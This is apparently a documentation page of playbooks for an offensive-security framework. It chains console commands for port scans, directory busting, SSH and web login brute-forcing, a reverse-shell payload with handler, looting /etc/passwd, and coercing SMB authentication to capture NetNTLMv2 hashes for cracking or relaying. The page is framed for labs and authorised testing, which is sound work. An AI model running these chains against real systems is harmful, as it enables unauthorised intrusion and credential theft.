# Workflows

Playbooks that chain the framework into full engagement patterns. Save
your own as resource files (`resource engagement.rc`) — methodology you
can replay is methodology that improves.

## Lab night: the full loop in five minutes

```
lab up web
use auxiliary/scanner/dir_buster
set RHOSTS 127.0.0.1
set RPORT 18080
set WORDLIST labs/web/wordlists/dirs.txt
set RECURSE true
run                      # findings -> loot

use auxiliary/login/http_login
set RHOSTS 127.0.0.1
set RPORT 18080
set MODE form
set TARGETPATH /login
set USERNAME admin
set PASS_FILE labs/web/wordlists/passwords.txt
run                      # credential -> creds

report lab-evidence.md
lab down web
```

Everything above works verbatim today. Note the order: enumeration wrote
loot, the attack wrote creds, the report read both.

## HTB-style box: recon → foothold → evidence

```
spool box-name.log                    # evidence habit: first, always
workspace htb-s8-boxname
setg LHOST tun0

# recon
use auxiliary/scanner/port_scan
set RHOSTS 10.10.11.20
set PORTS 1-10000
run -j                                # background while you think
jobs -o 1

# web? fingerprint + bust
use auxiliary/scanner/http_headers
set RHOSTS 10.10.11.20
set RPORT 80
run
use auxiliary/scanner/dir_buster
set RHOSTS 10.10.11.20
set RPORT 80
set WORDLIST /usr/share/wordlists/dirb/common.txt
set RECURSE true
run -j

# something to brute? ssh/web login with framework creds first
use auxiliary/login/ssh_login
set RHOSTS 10.10.11.20
set USER_FILE users.txt
set PASS_FILE passwords.txt
run -j

# foothold: handler first, payload second
use exploits/multi/handler
set LPORT 4444
run -j
use payloads/python_reverse_tcp
set LPORT 4444
generate                              # deliver via your exploit primitive
# [+] Session 1 opened
sessions -u 1                         # pty upgrade, then interact

# pillage: loot files, creds, then report
loot -f file etc-passwd /tmp/looted-passwd
report box-name.md
```

## Writing a module mid-engagement

The framework's reason to exist. New service you've never seen?

```
template auxiliary/scanner/redis_enum
reload
use auxiliary/scanner/redis_enum     # fill TODOs, edit, reload, repeat
```

Iterate against a lab if one fits (`lab up`), or the real target if it's
yours to touch. When it works: unit tests for the helpers, integration
if there's a lab. See [[Modules]], [[Testing]].

## Recon as a replayable resource file

`~/recon.rc`:

```
# standard opening moves — resource recon.rc
setg LHOST tun0
use auxiliary/scanner/port_scan
set PORTS 1-10000
run -j
use auxiliary/scanner/http_headers
run
```

`./forge.py -r ~/recon.rc` — boots, runs it, drops you interactive
with jobs already going.

## The coerce -> capture loop

Two consoles (or `run -j` the capture):

```
# console 1 — listen for the phoned-home auth (445 needs root)
use auxiliary/attack/smb_capture
set LPORT 445
run

# console 2 — make the target phone home
use auxiliary/attack/coerce
set RHOSTS target.corp.local
set LISTENER <your forge box>
set DOMAIN corp.local
set USERNAME anyuser
set PASSWORD ...
run
```

The coerced machine account's NetNTLMv2 lands in loot (type 'hash',
hashcat mode 5600, challenge pinned to 1122334455667788). Forwarding
the auth to a second target (real relay) is ntlmrelayx's job — point
its listener at the same coerce result.
